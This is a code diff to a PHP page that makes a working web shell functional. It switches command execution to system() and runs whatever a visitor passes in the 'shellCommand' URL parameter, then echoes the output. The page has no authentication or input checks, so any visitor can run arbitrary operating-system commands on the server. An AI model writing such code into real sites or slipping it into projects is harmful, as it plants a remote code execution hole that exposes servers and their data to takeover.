@@ -1,4 +1,6 @@
 <?php
+	error_reporting(E_ALL);
+
 	class UserInterface
 	{
 		public $pwd = "";
@@ -9,14 +11,12 @@
 
 		public function doCommand($command)
 		{
-			$mode = $this->mode;
-			return popen($command,$command);
+			return system($command);
 		}
 		
 		public function getPwd()
 		{
-			$this->pwd = popen("/bin/pwd",$this->mode);
-			return $this->pwd;
+			$this->doCommand("/bin/pwd");
 		}
 
 		public function cd($path)
@@ -30,21 +30,16 @@
 		}
 	}
  
-	if(isset($_GET['shellCommand'])) {
-		$myCommand = $_GET['shellCommand'];
-		$shellOut = $userInterface.doCommand($myCommand);
-	}
-?>
+	?>
 
-<?php if (isset($_GET['command'])): ?>
+<?php if (isset($_GET['command']) || isset($_GET['shellCommand'])): ?>
 <?php
 	$userInterface = new UserInterface();
 	if(isset($_GET['command'])) {
 		$command = $_GET['command'];
 		switch($command) {
 			case "pwd":
-				#$pwd = $userInterface.getPwd();
-				echo "pwd";
+				$userInterface->getPwd();
 				break;
 			case "perm":
 				$permissions = $userInterface.getPermissions();
@@ -54,6 +49,14 @@
 				break;
 		}
 	}
+	
+	if(isset($_GET['shellCommand'])) {
+		$myCommand = $_GET['shellCommand'];
+		$shellOut = $userInterface->doCommand($myCommand);
+		echo $shellOut;
+	}
+
+
 ?>
 <?php else: ?>
 
